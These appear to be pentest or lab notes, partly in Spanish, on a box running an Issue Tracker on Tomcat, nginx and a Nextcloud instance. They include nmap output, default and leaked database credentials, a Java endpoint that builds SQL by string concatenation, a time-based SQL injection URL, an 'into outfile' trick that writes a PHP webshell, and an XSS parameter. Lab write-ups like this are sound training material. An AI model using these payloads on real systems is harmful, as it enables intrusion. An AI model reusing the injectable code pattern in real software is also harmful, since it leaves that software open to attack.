## Notes

- sqli in 50080 checkByPriority. Get mysql version, try udf
- 
## Nmap

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open  http    Apache Tomcat (language: en)
|_http-title: Issue Tracker
|_http-trane-info: Problem with XML parsing of /evox/about
30455/tcp open  http    nginx 1.18.0
|_http-title: W3.CSS
|_http-server-header: nginx/1.18.0
50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
|_http-title: W3.CSS Template
```

## 17445 - Apache Tomcat
- Crear / modificar / borrar usuarios
- Crear /modificar /borrar issues
- Registrar / Login
- No encontramos sql
- Encontramos SQL gracias al código analizado en issuetracker.zip
	- ==Podemos explotarlo para subir una shell a `/srv/http/test.php` mediante `select 'blabla' into outfile '/srv/http/test.php'`==
Fuzzing
- Register
- Login
- User
- Issue
## 30455 nginx
- php 7.4.15 (phpinfo)
	- ==We have a lot of information needed in phpinfo==
- Tenemos XSS `http://192.168.228.147:30455/index.php?title=`
- Fuzzing
	- index.php
	- phpinfo.php
## 50080

- Nextcloud application for file storage
- Credentials -> admin:admin
- We find issuetracker.zip source code and DB credentials -> issue_user:ManagementInsideOld797
- There is a SQLi in the code `issue/checkByPriority`
	- `http://192.168.197.147:17445/issue/checkByPriority?priority=Normal'+union+all+select+sleep(5)--+-`

```
    @GetMapping("/issue/checkByPriority")
 17     public String checkByPriority(@RequestParam("priority") String priority, Model model) {
 16         //
 15         // Custom code, need to integrate to the JPA
 14         //
 13         Properties connectionProps = new Properties();
 12         connectionProps.put("user", "issue_user");
 11         connectionProps.put("password", "ManagementInsideOld797");
 10         try {
  9             conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
  8             String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
  7             System.out.println(query);
  6             Statement stmt = conn.createStatement();
  5             stmt.executeQuery(query);
  4
  3         } catch (SQLException e1) {
  2             // TODO Auto-generated catch block
  1             e1.printStackTrace();
78          }
  1
  2         // TODO: Return the list of the issues with the correct priority
  3         List<Issue> issues = service.GetAll();
  4         model.addAttribute("issuesList", issues);
  5         return "issue_index";
  6
  7     }
```

